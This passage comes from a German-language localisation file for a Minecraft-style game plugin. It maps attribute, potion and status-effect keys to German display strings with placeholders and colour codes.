  ""attribute_vanilla_exp_gain"": ""%icon%%value% Verzauberungserfahrungskugeln"",
  ""attribute_damage_taken"": ""%icon%%value% Erlittener Schaden"",
  ""attribute_reflect_chance"": ""%icon%%value% Reflexionswahrscheinlichkeit"",
  ""attribute_reflect_fraction"": ""%icon%%value% Reflexionsschaden"",
  ""attribute_generic_luck"": ""%icon%%value% Glück"",
  ""attribute_generic_armor"": ""%icon%%value% Rüstung"",
  ""attribute_generic_armor_toughness"": ""%icon%%value% Rüstungshärte"",
  ""attribute_generic_attack_damage"": ""%icon%%value% Angriffsstärke"",
  ""attribute_generic_attack_speed"": ""%icon%%value% Angriffsgeschwindigkeit"",
  ""attribute_generic_knockback_resistance"": ""%icon%%value% Rückstoßresistenz"",
  ""attribute_generic_max_health"": ""%icon%%value% Maximale Gesundheit"",
  ""attribute_generic_movement_speed"": ""%icon%%value% Bewegungsgeschwindigkeit"",
  ""attribute_sneak_movement_speed_bonus"": ""%icon%%value% Schleichgeschwindigkeit"",
  ""attribute_sprint_movement_speed_bonus"": ""%icon%%value% Renngeschwindigkeit"",
  ""attribute_damage_explosion"": ""%icon%%value% Explosionsschaden"",
  ""attribute_damage_fire"": ""%icon%%value% Feuerschaden"",
  ""attribute_damage_magic"": ""%icon%%value% Magieschaden"",
  ""attribute_damage_poison"": ""%icon%%value% Giftschaden"",
  ""attribute_damage_bludgeoning"": ""%icon%%value% Stumpfer Schaden"",
  ""attribute_damage_lightning"": ""%icon%%value% Blitzschaden"",
  ""attribute_damage_freezing"": ""%icon%%value% Frostschaden"",
  ""attribute_damage_radiant"": ""%icon%%value% Strahlenschaden"",
  ""attribute_damage_necrotic"": ""%icon%%value% Nekrose-Schaden"",
  ""attribute_extra_explosion_damage"": ""%icon%%value% Explosionsschaden"",
  ""attribute_extra_fire_damage"": ""%icon%%value% Feuerschaden"",
  ""attribute_extra_magic_damage"": ""%icon%%value% Magieschaden"",
  ""attribute_extra_poison_damage"": ""%icon%%value% Giftschaden"",
  ""attribute_extra_bludgeoning_damage"": ""%icon%%value% Stumpfer Schaden"",
  ""attribute_extra_lightning_damage"": ""%icon%%value% Blitzschaden"",
  ""attribute_extra_freezing_damage"": ""%icon%%value% Frostschaden"",
  ""attribute_extra_radiant_damage"": ""%icon%%value% Strahlenschaden"",
  ""attribute_extra_necrotic_damage"": ""%icon%%value% Nekrose-Schaden"",
  ""attribute_cooking_speed"": ""%icon%%value% Kochgeschwindigkeit"",
  ""attribute_jump_height"": ""%icon%%value% Sprungweite"",
  ""attribute_jumps"": ""%icon%%value% Mehrfachsprünge"",
  ""attribute_entity_drops"": ""%icon%%value% Mobs-Ausbeute"",
  ""attribute_light_armor"": ""%icon%%value% Leichte Rüstung"",
  ""attribute_heavy_armor"": ""%icon%%value% Schwere Rüstung"",
  ""attribute_lapis_save_chance"": ""%icon%%value% Lapiskonsumtion"",
  ""attribute_enchanting_refund_chance"": ""%icon%%value% Erfahrungskugel-Rückgabewahr-scheinlichkeit"",
  ""attribute_enchanting_refund_fraction"": ""%icon%%value% Rückgegebe-ne Erfahrungskugeln"",
  ""attribute_lingering_duration_multiplier"": ""%icon%%value% Nachhall-Dauer"",
  ""attribute_lingering_radius_multiplier"": ""%icon%%value% Nachhall-Reichweite"",
  ""attribute_splash_intensity_minimum"": ""%icon%%value% Spritz-Effizienz"",
  ""attribute_entity_rare_drops"": ""%icon%%value% Mobs-Schatz-Glück"",
  ""attribute_dig_speed"": ""%icon%%value% Abbaugeschwindigkeit"",
  ""attribute_mining_speed"": ""%icon%%value% Abbaugeschwindigkeit"",
  ""attribute_durability_multiplier"": ""%icon%%value% Haltbarkeit"",
  ""attribute_crossbow_magazine"": """",
  ""attribute_attack_reach_multiplier"": ""%icon%%value% Angriffsreichweite"",
  ""attribute_generic_scale"": ""%icon%%value% Größe"",
  ""attribute_generic_block_interaction_range"": ""%icon%%value% Reichweite"",
  ""attribute_generic_step_height"": ""%icon%%value% Schrittweite"",
  ""attribute_shield_disarming"": ""%icon%%value% Schildentwaffen"",
  ""attribute_life_steal"": ""%icon%%value% Lebensraub"",
  ""attribute_generic_gravity"": ""%icon%%value% Gravitation"",
  ""attribute_generic_safe_fall_distance"": ""%icon%%value% Fallhöhe"",
  ""attribute_generic_fall_damage_multiplier"": ""%icon%%value% Fallschaden"",
  ""stat_attribute_negative_prefix"": ""&c"",
  ""stat_attribute_positive_prefix"": ""&7"",
  
  ""potion_effect_charges_format"": ""&7(%prefix%%charges_numeric%x&7)"",
  ""potion_effect_display"": ""&7&lAktive Effekte"",
  ""combined_potion_name"": ""&d"",
  
  ""potion_name_heal"": ""Heilung"",
  ""potion_name_bad_omen"": ""Krieg"",
  ""potion_name_harm"": ""Schaden"",
  ""potion_name_saturation"": ""Sättigung"",
  ""potion_name_absorption"": ""Absorption"",
  ""potion_name_conduit_power"": ""Leitungsenergie"",
  ""potion_name_blindness"": ""Blindheit"",
  ""potion_name_darkness"": ""Abgrund"",
  ""potion_name_confusion"": ""Übelkeit"",
  ""potion_name_damage_resistance"": ""Schildkrötenmeister"",
  ""potion_name_fast_digging"": ""Eile"",
  ""potion_name_fire_resistance"": ""Feuerresistenz"",
  ""potion_name_glowing"": ""Leuchten"",
  ""potion_name_custom_health_boost"": ""Vitalität"",
  ""potion_name_health_boost"": ""Vitalität"",
  ""potion_name_hero_of_the_village"": ""Handeln"",
  ""potion_name_hunger"": ""Hunger"",
  ""potion_name_increase_damage"": ""Stärke"",
  ""potion_name_invisibility"": ""Unsichtbarkeit"",
  ""potion_name_jump"": ""Sprungkraft"",
  ""potion_name_levitation"": ""Levitation"",
  ""potion_name_luck"": ""Glück"",
  ""potion_name_poison"": ""Gift"",
  ""potion_name_regeneration"": ""Regeneration"",
  ""potion_name_slow"": ""Langsamkeit"",
  ""potion_name_slow_digging"": ""Müdigkeit"",
  ""potion_name_slow_falling"": ""Langsames Fallen"",
  ""potion_name_speed"": ""Geschwindigkeit"",
  ""potion_name_custom_speed"": ""Geschwindigkeit"",
  ""potion_name_unluck"": ""Pech"",
  ""potion_name_water_breathing"": ""Wasseratmung"",
  ""potion_name_weakness"": ""Schwäche"",
  ""potion_name_wither"": ""Verfall"",
  ""potion_name_night_vision"": ""Nachtsicht"",
  ""potion_name_bow_strength"": ""Kraft"",
  ""potion_name_arrow_damage"": ""Wucht"",
  ""potion_name_ammo_consumption"": ""Nachschub"",
  ""potion_name_arrow_velocity"": ""Bolzen"",
  ""potion_name_arrow_accuracy"": ""Präzision"",
  ""potion_name_arrow_piercing"": ""Durchdringung"",
  ""potion_name_knockback"": ""Rückstoß"",
  ""potion_name_stun_chance"": ""Betäubung"",
  ""potion_name_bleed_chance"": ""Blutung"",
  ""potion_name_bleed_damage"": ""Blutung"",
  ""potion_name_bleed_duration"": ""Blutung"",
  ""potion_name_crit_chance"": ""Fokus"",
  ""potion_name_crit_damage"": ""Fokus"",
  ""potion_name_armor_penetration_flat"": ""Zertrümmerung"",
  ""potion_name_light_armor_penetration_flat"": ""Zertrümmerung"",
  ""potion_name_heavy_armor_penetration_flat"": ""Zertrümmerung"",
  ""potion_name_armor_penetration_fraction"": ""Zerschmetterung"",
  ""potion_name_light_armor_penetration_fraction"": ""Zerschmetterung"",
  ""potion_name_heavy_armor_penetration_fraction"": ""Zerschmetterung"",
  ""potion_name_heavy_armor_damage"": ""Ritterbann"",
  ""potion_name_light_armor_damage"": ""Assassinenbann"",
  ""potion_name_immunity_bonus_fraction"": ""Göttlicher Schutz"",
  ""potion_name_immunity_bonus_flat"": ""Göttlicher Schutz"",
  ""potion_name_immunity_reduction"": ""Ketzerei"",
  ""potion_name_damage_unarmed"": ""Rauferei"",
  ""potion_name_damage_melee"": ""Duell"",
  ""potion_name_damage_ranged"": ""Scharfschützentum"",
  ""potion_name_damage_all"": ""Liquidation"",
  ""potion_name_attack_reach"": ""Reichweite"",
  ""potion_name_velocity_damage"": ""Stoß"",
  ""potion_name_dismount_chance"": ""Abwurf"",
  ""potion_name_custom_damage_resistance"": ""Ambrosia"",
  ""potion_name_explosion_resistance"": ""Explosionsresistenz"",
  ""potion_name_fall_damage_resistance"": ""Fallresistenz"",
  ""potion_name_custom_fire_resistance"": ""Feuerresistenz"",
  ""potion_name_magic_resistance"": ""Magieresistenz"",
  ""potion_name_bludgeoning_resistance"": ""Kraftresistenz"",
  ""potion_name_lightning_resistance"": ""Blitzresistenz"",
  ""potion_name_freezing_resistance"": ""Frostresistenz"",
  ""potion_name_radiant_resistance"": ""Strahlungsresistenz"",
  ""potion_name_necrotic_resistance"": ""Nekroseresistenz"",
  ""potion_name_crit_chance_resistance"": ""Achtsamkeit"",
  ""potion_name_crit_damage_resistance"": ""Abprallung"",
  ""potion_name_bleed_resistance"": ""Wundheilung"",
  ""potion_name_stun_resistance"": ""Stabilität"",
  ""potion_name_poison_resistance"": ""Gegenmittel"",
  ""potion_name_projectile_resistance"": ""Projektilresistenz"",
  ""potion_name_melee_resistance"": ""Nahkampfresistenz"",
  ""potion_name_dodge_chance"": ""Ausweichen"",
  ""potion_name_healing_bonus"": ""Wiederherstellung"",
  ""potion_name_food_consumption"": ""Sättigung"",
  ""potion_name_cooldown_reduction"": ""Ehrgeiz"",
  ""potion_name_explosion_power"": ""Zerstörung"",
  ""potion_name_crafting_speed"": ""Produktivität"",
  ""potion_name_alchemy_quality"": ""Alchemie"",
  ""potion_name_alchemy_quality_fraction"": ""Alchemie"",
  ""potion_name_enchanting_quality"": ""Verzauberung"",
  ""potion_name_enchanting_quality_fraction"": ""Verzauberung"",
  ""potion_name_anvil_quality_flat"": ""Verzauberung"",
  ""potion_name_anvil_quality_fraction"": ""Verzauberung"",
  ""potion_name_brewing_ingredient_consumption"": """",
  ""potion_name_smithing_quality"": ""Schmiedekunst"",
  ""potion_name_smithing_quality_fraction"": ""Schmiedekunst"",
  ""potion_name_brewing_speed"": ""Reaktivität"",
  ""potion_name_potion_consumption"": ""Flaschen Füllen"",
  ""potion_name_throwing_velocity"": ""Werfen"",
  ""potion_name_mining_rare_drops"": ""Schatz"",
  ""potion_name_mining_drops"": ""Schatz"",
  ""potion_name_woodcutting_rare_drops"": ""Abholzen"",
  ""potion_name_woodcutting_drops"": ""Abholzen"",
  ""potion_name_digging_rare_drops"": ""Archäologie"",
  ""potion_name_digging_drops"": ""Archäologie"",
  ""potion_name_farming_rare_drops"": ""Landwirtschaft"",
  ""potion_name_farming_drops"": ""Landwirtschaft"",
  ""potion_name_fishing_luck"": ""Schatz"",
  ""potion_name_skill_exp_gain"": ""Lernen"",
  ""potion_name_vanilla_exp_gain"": ""Aussaugen"",
  ""potion_name_damage_taken"": ""Verletzlichkeit"",
  ""potion_name_reflect_chance"": ""Reflexion"",
  ""potion_name_reflect_fraction"": ""Reflexion"",
  ""potion_name_custom_luck"": ""Glück"",
  ""potion_name_armor_flat"": ""Rüstung"",
  ""potion_name_armor_fraction"": ""Rüstung"",
  ""potion_name_armor_toughness_flat"": ""Härte"",
  ""potion_name_armor_toughness_fraction"": ""Härte"",
  ""potion_name_attack_speed"": ""Klingen"",
  ""potion_name_knockback_resistance"": ""Standfestigkeit"",
  ""potion_name_max_health_flat"": ""Vitalität"",
  ""potion_name_max_health_fraction"": ""Vitalität"",
  ""potion_name_movement_speed"": ""Geschwindigkeit"",
  ""potion_name_smithing_masterpiece_flat"": ""Meisterwerk"",
  ""potion_name_smithing_masterpiece_fraction"": ""Meisterwerk"",
  ""potion_name_enchanting_masterpiece_flat"": ""Arkanwissen"",
  ""potion_name_enchanting_masterpiece_fraction"": ""Arkanwissen"",
  ""potion_name_alchemy_masterpiece_flat"": ""Magnum Opus"",
  ""potion_name_alchemy_masterpiece_fraction"": ""Magnum Opus"",
  ""potion_name_damage_explosion"": ""Explosionsaspekt"",
  ""potion_name_damage_fire"": ""Feueraspekt"",
  ""potion_name_damage_magic"": ""Magie-Aspekt"",
  ""potion_name_damage_poison"": ""Giftaspekt"",
  ""potion_name_damage_bludgeoning"": ""Kraftaspekt"",
  ""potion_name_damage_lightning"": ""Blitzaspekt"",
  ""potion_name_damage_freezing"": ""Frostaspekt"",
  ""potion_name_damage_radiant"": ""Strahlungsaspekt"",
  ""potion_name_damage_necrotic"": ""Nekrose-Aspekt"",
  ""potion_name_extra_explosion_damage"": ""Explosionsaspekt"",
  ""potion_name_extra_fire_damage"": ""Feueraspekt"",
  ""potion_name_extra_magic_damage"": ""Magie-Aspekt"",
  ""potion_name_extra_poison_damage"": ""Giftaspekt"",
  ""potion_name_extra_bludgeoning_damage"": ""Kraftaspekt"",
  ""potion_name_extra_lightning_damage"": ""Blitzaspekt"",
  ""potion_name_extra_freezing_damage"": ""Frostaspekt"",
  ""potion_name_extra_radiant_damage"": ""Strahlungsaspekt"",
  ""potion_name_extra_necrotic_damage"": ""Nekrose-Aspekt"",
  ""potion_name_extra_attack_damage"": ""Stärke"",
  ""potion_name_cooking_speed"": ""Hochflammend"",
  ""potion_name_sneak_movement_speed_bonus"": ""Flinkes Schleichen"",
  ""potion_name_sprint_movement_speed_bonus"": ""Rennen"",
  ""potion_name_stun"": ""Betäubung"",
  ""potion_name_fire"": ""Napalm"",
  ""potion_name_jumps"": ""Luftsprünge"",
  ""potion_name_jump_height"": ""Springen"",
  ""potion_name_durability_multiplier"": ""Beständigkeit"",
  ""potion_name_light_armor"": ""Lederhaut"",
  ""potion_name_heavy_armor"": ""Eisenhaut"",
  ""potion_name_entity_drops"": ""Plünderung"",
  ""potion_name_instant_explosion_damage"":""Explosion"",
  ""potion_name_instant_fire_damage"": ""Napalm"",
  ""potion_name_instant_poison_damage"": ""Virulenz"",
  ""potion_name_instant_magic_damage"": ""Zauberei"",
  ""potion_name_instant_melee_damage"": ""Abgehärtete Klinge"",
  ""potion_name_instant_projectile_damage"": ""Abgehärteter Bolzen"",
  ""potion_name_instant_bludgeoning_damage"": ""Abgehärtete Härte"",
  ""potion_name_instant_lightning_damage"": ""Schock"",
  ""potion_name_instant_freezing_damage"": ""Frost"",
  ""potion_name_instant_radiant_damage"": ""Weihwasser"",
  ""potion_name_instant_necrotic_damage"": ""Verfluchtes Wasser"",
  ""potion_name_bleed"": ""Ruinierung"",
  ""potion_name_recall"": ""Rückruf"",
  ""potion_name_antibleed"": ""Versiegelung"",
  ""potion_name_custom_heal"": ""Heilung"",
  ""potion_name_lapis_save_chance"": ""Verzauberung"",
  ""potion_name_enchanting_refund_chance"": ""Verzauberung"",
  ""potion_name_enchanting_refund_fraction"": ""Verzauberung"",
  ""potion_name_lingering_duration_multiplier"": ""Alchemie"",
  ""potion_name_lingering_radius_multiplier"": ""Alchemie"",
  ""potion_name_splash_intensity_minimum"": ""Alchemie"",
  ""potion_name_entity_rare_drops"": ""Plünderung"",
  ""potion_name_dig_speed"": ""Bohrung"",
  ""potion_name_crossbow_magazine"": ""Bogenschießen"",
  ""potion_name_attack_reach_multiplier"": ""Reichweite"",
  ""potion_name_generic_scale"": ""Riesen"",
  ""potion_name_generic_block_interaction_range"": ""Reichweite"",
  ""potion_name_generic_step_height"": ""Schreiten"",
  ""potion_name_shield_disarming"": ""Zerbrechen"",
  ""potion_name_life_steal"": ""Vampirismus"",
  ""potion_name_generic_gravity"": ""Masse"",
  ""potion_name_generic_safe_fall_distance"": ""Kapazität"",
  ""potion_name_generic_fall_damage_multiplier"": ""Schaden"",
  ""potion_name_chocolate_milk"": ""Schokomilch"",
  ""potion_name_milk"": ""Milch"",
  ""effect_name_heal"": ""%icon% Sofortige Heilung %value%"",
  ""effect_name_bad_omen"": ""%icon% Schlechtes Omen %value% %duration%"",
  ""effect_name_harm"": ""%icon% Sofortiger Schaden %value%"",
  ""effect_name_saturation"": ""%icon% Sättigung %value%"",
  ""effect_name_absorption"": ""%icon% Absorption %value% %duration%"",
  ""effect_name_conduit_power"": ""%icon% Leitungsenergie %duration%"",
  ""effect_name_blindness"": ""%icon% Blindheit %duration%"",
  ""effect_name_darkness"": ""%icon% Dunkelheit %duration%"",
  ""effect_name_dolphins_grace"": ""%icon% Delphin-Anmut %duration%"",
  ""effect_name_confusion"": ""%icon% Übelkeit %duration%"",
  ""effect_name_damage_resistance"": ""%icon% Resistenz %value% %duration%"",
  ""effect_name_fast_digging"": ""%icon% Eile %value% %duration%"",
  ""effect_name_fire_resistance"": ""%icon% Feuerresistenz %duration%"",
  ""effect_name_glowing"": ""%icon% Leuchten %duration%"",
  ""effect_name_health_boost"": ""%icon% Vitalitätsboost %value% %duration%"",
  ""effect_name_hero_of_the_village"": ""%icon% Dorfheld %value% %duration%"",
  ""effect_name_hunger"": ""%icon% Hunger %value% %duration%"",
  ""effect_name_increase_damage"": ""%icon% Stärke %value% %duration%"",
  ""effect_name_invisibility"": ""%icon% Unsichtbarkeit %duration%"",
  ""effect_name_jump"": ""%icon% Sprungkraft %value% %duration%"",
  ""effect_name_levitation"": ""%icon% Levitation %value% %duration%"",
  ""effect_name_luck"": ""%icon% Glück %value% %duration%"",
  ""effect_name_poison"": ""%icon% Gift %value% %duration%"",
  ""effect_name_regeneration"": ""%icon% Regeneration %value% %duration%"",
  ""effect_name_slow"": ""%icon% Verlangsamung %value% %duration%"",
  ""effect_name_slow_digging"": ""%icon% Müdigkeit %value% %duration%"",
  ""effect_name_slow_falling"": ""%icon% Langsames Fallen %duration%"",
  ""effect_name_speed"": ""%icon% Geschwindigkeit %value% %duration%"",
  ""effect_name_unluck"": ""%icon% Pech %value% %duration%"",
  ""effect_name_water_breathing"": ""%icon% Wasseratmung %duration%"",
  ""effect_name_weakness"": ""%icon% Schwäche %value% %duration%"",
  ""effect_name_wither"": ""%icon% Verfall %value% %duration%"",
  ""effect_name_night_vision"": ""%icon% Nachtsicht %duration%"",
  ""effect_name_bow_strength"": ""%icon% Bogenkraft %value% %duration%"",
  ""effect_name_arrow_damage"": ""%icon% Pfeilschaden %value% %duration%"",
  ""effect_name_ammo_consumption"": ""%icon% Munitionsverbrauch %value% %duration%"",
  ""effect_name_arrow_velocity"": ""%icon% Pfeilgeschwindigkeit %value% %duration%"",
  ""effect_name_arrow_accuracy"": ""%icon% Genauigkeit %value% %duration%"",
  ""effect_name_arrow_piercing"": ""%icon% Durchschlagskraft %value% %duration%"",
  ""effect_name_knockback"": ""%icon% Rückstoß %value% %duration%"",
  ""effect_name_stun_chance"": ""%icon% Betäubungswahrscheinlichkeit %value% %duration%"",
  ""effect_name_bleed_chance"": ""%icon% Blutverlust-Chance %value% %duration%"",
  ""effect_name_bleed_damage"": ""%icon% Blutverlust-Schaden %value% %duration%"",
  ""effect_name_bleed_duration"": ""%icon% Blutverlust-Dauer %value% %duration%"",
  ""effect_name_crit_chance"": ""%icon% Krit-Chance %value% %duration%"",
  ""effect_name_crit_damage"": ""%icon% Krit-Schaden %value% %duration%"",
  ""effect_name_armor_penetration_flat"": ""%icon% Rüstungsdurchdringung %value% %duration%"",
  ""effect_name_light_armor_penetration_flat"": ""%icon% Leichte Rüstungsdurchdringung %value% %duration%"",
  ""effect_name_heavy_armor_penetration_flat"": ""%icon% Schwere Rüstungsdurchdringung %value% %duration%"",
  ""effect_name_armor_penetration_fraction"": ""%icon% Rüstungsdurchdringung %value% %duration%"",
  ""effect_name_light_armor_penetration_fraction"": ""%icon% Leichte Rüstungsdurchdringung %value% %duration%"",
  ""effect_name_heavy_armor_penetration_fraction"": ""%icon% Schwere Rüstungsdurchdringung %value% %duration%"",
  ""effect_name_heavy_armor_damage"": ""%icon% Schwere Rüstungsschaden %value% %duration%"",
  ""effect_name_light_armor_damage"": ""%icon% Leichte Rüstungsschaden %value% %duration%"",
  ""effect_name_immunity_bonus_fraction"": ""%icon% Immunität %value% %duration%"",
  ""effect_name_immunity_bonus_flat"": ""%icon% Immunität %value% %duration%"",
  ""effect_name_immunity_reduction"": ""%icon% Immunitätsreduktion %value% %duration%"",
  ""effect_name_damage_unarmed"": ""%icon% Unbewaffneter Schaden %value% %duration%"",
  ""effect_name_damage_melee"": ""%icon% Nahkampfschaden %value% %duration%"",
  ""effect_name_damage_ranged"": ""%icon% Fernkampfschaden %value% %duration%"",
  ""effect_name_damage_all"": ""%icon% Schaden %value% %duration%"",
  ""effect_name_attack_reach"": ""%icon% Angriffsreichweite %value% %duration%"",
  ""effect_name_velocity_damage"": ""%icon% Stoßschaden %value% %duration%"",
  ""effect_name_dismount_chance"": ""%icon% Abwurf-Chance %value% %duration%"",
  ""effect_name_custom_damage_resistance"": ""%icon% Schadensresistenz %value% %duration%"",
  ""effect_name_explosion_resistance"": ""%icon% Explosionsresistenz %value% %duration%"",
  ""effect_name_fall_damage_resistance"": ""%icon% Fallschadenresistenz %value% %duration%"",
  ""effect_name_custom_fire_resistance"": ""%icon% Feuerresistenz %value% %duration%"",
  ""effect_name_magic_resistance"": ""%icon% Magieresistenz %value% %duration%"",
  ""effect_name_bludgeoning_resistance"": ""%icon% Stumpf-Resistenz %value% %duration%"",
  ""effect_name_lightning_resistance"": ""%icon% Blitzresistenz %value% %duration%"",
  ""effect_name_freezing_resistance"": ""%icon% Frostresistenz %value% %duration%"",
  ""effect_name_radiant_resistance"": ""%icon% Strahlungsresistenz %value% %duration%"",
  ""effect_name_necrotic_resistance"": ""%icon% Nekrose-Resistenz %value% %duration%"",
  ""effect_name_crit_chance_resistance"": ""%icon% Krit-Chance-Resistenz %value% %duration%"",
  ""effect_name_crit_damage_resistance"": ""%icon% Krit-Schaden-Resistenz %value% %duration%"",
  ""effect_name_bleed_resistance"": ""%icon% Blutungen-Resistenz %value% %duration%"",
  ""effect_name_stun_resistance"": ""%icon% Betäubungsresistenz %value% %duration%"",
  ""effect_name_poison_resistance"": ""%icon% Giftresistenz %value% %duration%"",
  ""effect_name_projectile_resistance"": ""%icon% Projektilresistenz %value% %duration%"",
  ""effect_name_melee_resistance"": ""%icon% Nahkampfresistenz %value% %duration%"",
  ""effect_name_dodge_chance"": ""%icon% Ausweichwahrscheinlichkeit %value% %duration%"",
  ""effect_name_healing_bonus"": ""%icon% Heilung %value% %duration%"",
  ""effect_name_food_consumption"": ""%icon% Hungerverbrauch %value% %duration%"",
  ""effect_name_cooldown_reduction"": ""%icon% Abklingzeitverkürzung %value% %duration%"",
  ""effect_name_explosion_power"": ""%icon% Explosionskraft %value% %duration%"",
  ""effect_name_crafting_speed"": ""%icon% Fertigungsgeschwindigkeit %value% %duration%"",
  ""effect_name_alchemy_quality"": ""%icon% Alchemie-Fertigkeit %value% %duration%"",
  ""effect_name_alchemy_quality_fraction"": ""%icon% Alchemie-Fertigkeit %value% %duration%"",
  ""effect_name_enchanting_quality"": ""%icon% Verzauberungsfertigkeit %value% %duration%"",
  ""effect_name_enchanting_quality_fraction"": ""%icon% Verzauberungsfertigkeit %value% %duration%"",
  ""effect_name_anvil_quality_flat"": ""%icon% Amboss-Fertigkeit %value% %duration%"",
  ""effect_name_anvil_quality_fraction"": ""%icon% Amboss-Fertigkeit %value% %duration%"",
  ""effect_name_smithing_quality"": ""%icon% Schmiedekunst %value% %duration%"",
  ""effect_name_smithing_quality_fraction"": ""%icon% Schmiedekunst %value% %duration%"",
  ""effect_name_brewing_ingredient_consumption"": ""%icon% Brau-Zutatenverbrauch %value% %duration%"",
  ""effect_name_brewing_speed"": ""%icon% Braugeschwindigkeit %value% %duration%"",
  ""effect_name_potion_consumption"": ""%icon% Tränkeverbrauch %value% %duration%"",
  ""effect_name_throwing_velocity"": ""%icon% Wurfreichweite %value% %duration%"",
  ""effect_name_mining_rare_drops"": ""%icon% Abbau-Glück %value% %duration%"",
  ""effect_name_mining_drops"": ""%icon% Abbauausbeute %value% %duration%"",
  ""effect_name_woodcutting_rare_drops"": ""%icon% Holzfällerer-Glück %value% %duration%"",
  ""effect_name_woodcutting_drops"": ""%icon% Holzfällerausbeute %value% %duration%"",
  ""effect_name_digging_rare_drops"": ""%icon% Grabe-Glück %value% %duration%"",
  ""effect_name_digging_drops"": ""%icon% Grabausbeute %value% %duration%"",
  ""effect_name_farming_rare_drops"": ""%icon% Landwirtschaft-Glück %value% %duration%"",
  ""effect_name_farming_drops"": ""%icon% Landwirtschaftsausbeute %value% %duration%"",
  ""effect_name_fishing_luck"": ""%icon% Angel-Glück %value% %duration%"",
  ""effect_name_skill_exp_gain"": ""%icon% Fertigkeiten-EP %value% %duration%"",
  ""effect_name_vanilla_exp_gain"": ""%icon% Verzauberungserfahrungskugeln %value% %duration%"",
  ""effect_name_damage_taken"": ""%icon% Erlittener Schaden %value% %duration%"",
  ""effect_name_reflect_chance"": ""%icon% Reflexionswahrscheinlichkeit %value% %duration%"",
  ""effect_name_reflect_fraction"": ""%icon% Reflexionsschaden %value% %duration%"",
  ""effect_name_custom_luck"": ""%icon% Glück %value% %duration%"",
  ""effect_name_armor_flat"": ""%icon% Rüstung %value% %duration%"",
  ""effect_name_armor_fraction"": ""%icon% Rüstung %value% %duration%"",
  ""effect_name_armor_toughness_flat"": ""%icon% Härte %value% %duration%"",
  ""effect_name_armor_toughness_fraction"": ""%icon% Härte %value% %duration%"",
  ""effect_name_attack_speed"": ""%icon% Angriffsgeschwindigkeit %value% %duration%"",
  ""effect_name_knockback_resistance"": ""%icon% Rückstoßresistenz %value% %duration%"",
  ""effect_name_max_health_flat"": ""%icon% Maximale Gesundheit %value% %duration%"",
  ""effect_name_max_health_fraction"": ""%icon% Maximale Gesundheit %value% %duration%"",
  ""effect_name_movement_speed"": ""%icon% Bewegungsgeschwindigkeit %value% %duration%"",
  ""effect_name_smithing_masterpiece_flat"": ""%icon% Kurzzeitige Schmiedekunst %value% %duration%"",
  ""effect_name_smithing_masterpiece_fraction"": ""%icon% Kurzzeitige Schmiedekunst %value% %duration%"",
  ""effect_name_enchanting_masterpiece_flat"": ""%icon% Kurzzeitige Verzauberungsfertigkeit %value% %duration%"",
  ""effect_name_enchanting_masterpiece_fraction"": ""%icon% Kurzzeitige Verzauberungsfertigkeit %value% %duration%"",
  ""effect_name_alchemy_masterpiece_flat"": ""%icon% Kurzzeitige Alchemie-Fertigkeit %value% %duration%"",
  ""effect_name_alchemy_masterpiece_fraction"": ""%icon% Kurzzeitige Alchemie-Fertigkeit %value% %duration%"",
  ""effect_name_chocolate_milk"": ""%icon% Schokomilch"",
  ""effect_name_milk"": ""%icon% Milch"",
  ""effect_name_damage_explosion"": ""%icon% Explosionsschaden %value% %duration%"",
  ""effect_name_damage_fire"": ""%icon% Feuerschaden %value% %duration%"",
  ""effect_name_damage_magic"": ""%icon% Magieschaden %value% %duration%"",
  ""effect_name_damage_poison"": ""%icon% Giftschaden %value% %duration%"",
  ""effect_name_damage_bludgeoning"": ""%icon% Stumpfer Schaden %value% %duration%"",
  ""effect_name_damage_lightning"": ""%icon% Blitzschaden %value% %duration%"",
  ""effect_name_damage_freezing"": ""%icon% Frostschaden %value% %duration%"",
  ""effect_name_damage_radiant"": ""%icon% Strahlenschaden %value% %duration%"",
  ""effect_name_damage_necrotic"": ""%icon% Nekrose-Schaden %value% %duration%"",
  ""effect_name_extra_explosion_damage"": ""%icon% Explosionsschaden %value% %duration%"",
  ""effect_name_extra_fire_damage"": ""%icon% Feuerschaden %value% %duration%"",
  ""effect_name_extra_magic_damage"": ""%icon% Magieschaden %value% %duration%"",
  ""effect_name_extra_poison_damage"": ""%icon% Giftschaden %value% %duration%"",
  ""effect_name_extra_bludgeoning_damage"": ""%icon% Stumpfer Schaden %value% %duration%"",
  ""effect_name_extra_lightning_damage"": ""%icon% Blitzschaden %value% %duration%"",
  ""effect_name_extra_freezing_damage"": ""%icon% Frostschaden %value% %duration%"",
  ""effect_name_extra_radiant_damage"": ""%icon% Strahlenschaden %value% %duration%"",
  ""effect_name_extra_necrotic_damage"": ""%icon% Nekrose-Schaden %value% %duration%"",
  ""effect_name_extra_attack_damage"": ""%icon% Angriffsstärke %value% %duration%"",
  ""effect_name_cooking_speed"": ""%icon% Kochgeschwindigkeit %value% %duration%"",
  ""effect_name_sneak_movement_speed_bonus"": ""%icon% Schleichgeschwindigkeit %value% %duration%"",
  ""effect_name_sprint_movement_speed_bonus"": ""%icon% Renngeschwindigkeit %value% %duration%"",
  ""effect_name_stun"": ""%icon% Betäubung %duration%"",
  ""effect_name_jumps"": ""%icon% Mehrfachsprünge %value% %duration%"",
  ""effect_name_jump_height"": ""%icon% Sprungweite %value% %duration%"",
  ""effect_name_durability_multiplier"": ""%icon% Haltbarkeit %value% %duration%"",
  ""effect_name_entity_drops"": ""%icon% Mobs-Ausbeute %value% %duration%"",
  ""effect_name_light_armor"": ""%icon% Leichte Rüstung %value% %duration%"",
  ""effect_name_heavy_armor"": ""%icon% Schwere Rüstung %value% %duration%"",
  ""effect_name_fire"": ""%icon% Feuer %duration%"",
  ""effect_name_instant_explosion_damage"":""%icon% Sofortiger Explosionsschaden %value%"",
  ""effect_name_instant_fire_damage"": ""%icon% Sofortiger Feuerschaden %value%"",
  ""effect_name_instant_poison_damage"": ""%icon% Sofortiger Giftschaden %value%"",
  ""effect_name_instant_magic_damage"": ""%icon% Sofortiger Magieschaden %value%"",
  ""effect_name_instant_melee_damage"": ""%icon% Sofortiger Nahkampfschaden %value%"",
  ""effect_name_instant_projectile_damage"": ""%icon% Sofortiger Projektilschaden %value%"",
  ""effect_name_instant_bludgeoning_damage"": ""%icon% Sofortiger Stumpfer Schaden %value%"",
  ""effect_name_instant_lightning_damage"": ""%icon% Sofortiger Blitzschaden %value%"",
  ""effect_name_instant_freezing_damage"": ""%icon% Sofortiger Frostschaden %value%"",
  ""effect_name_instant_radiant_damage"": ""%icon% Sofortiger Strahlenschaden %value%"",
  ""effect_name_instant_necrotic_damage"": ""%icon% Sofortiger Nekrose-Schaden %value%"",
  ""effect_name_bleed"": ""%icon% Blutung %value% Schaden %duration%"",
